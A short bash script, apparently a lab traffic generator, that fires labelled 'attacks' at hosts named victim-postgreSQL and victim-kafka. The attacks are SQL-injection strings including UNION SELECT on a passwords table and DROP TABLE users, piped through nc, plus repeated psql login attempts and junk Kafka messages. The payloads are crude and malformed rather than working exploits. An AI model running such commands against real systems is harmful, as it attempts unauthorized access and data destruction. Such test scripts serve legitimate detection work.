#!/bin/bash
set -e

echo "=== Starting attacks on victim services ==="

# Атака на PostgreSQL
echo "--- Attacking PostgreSQL (victim-postgreSQL:5432) ---"
echo "Attempting SQL injection..."
timeout 5 bash -c "echo -e '\x00\x00\x00\x08\x04\xd2\x16\x2fSELECT * FROM users WHERE id=1 OR '\''1'\''='\''1'\'';' | nc victim-postgreSQL 5432" || echo "SQL injection attempt completed"

echo "Attempting SQL injection with UNION SELECT..."
timeout 5 bash -c "echo -e '\x00\x00\x00\x08\x04\xd2\x16\x2fSELECT * FROM users UNION SELECT * FROM passwords;' | nc victim-postgreSQL 5432" || echo "UNION SELECT injection attempt completed"

echo "Attempting SQL injection with DROP TABLE..."
timeout 5 bash -c "echo -e '\x00\x00\x00\x08\x04\xd2\x16\x2fDROP TABLE users;' | nc victim-postgreSQL 5432" || echo "DROP TABLE injection attempt completed"

echo "Attempting brute force connection..."
for i in {1..5}; do
  timeout 2 psql -h victim-postgreSQL -U postgres -d victimdb -c "SELECT 1;" 2>/dev/null && echo "Connection attempt $i succeeded" || echo "Connection attempt $i failed"
  sleep 1
done

echo "Attempting unauthorized access with wrong credentials..."
timeout 2 psql -h victim-postgreSQL -U admin -d victimdb -W wrongpassword 2>/dev/null || echo "Unauthorized access attempt blocked"

# Атака на Kafka
echo "--- Attacking Kafka (victim-kafka:9092) ---"
echo "Attempting unauthorized topic creation (malicious-topic)..."
timeout 5 bash -c "echo -e 'malicious-topic' | nc victim-kafka 9092" || echo "Unauthorized topic creation attempt completed"

echo "Attempting protocol exploitation..."
timeout 5 bash -c "echo -ne '\x00\x00\x00\x01\x00' | nc victim-kafka 9092" || echo "Protocol exploitation attempt completed"

echo "Attempting message injection..."
timeout 5 bash -c "echo -e 'malicious payload for test-topic' | nc victim-kafka 9092" || echo "Message injection attempt completed"

echo "=== Attacks completed ==="
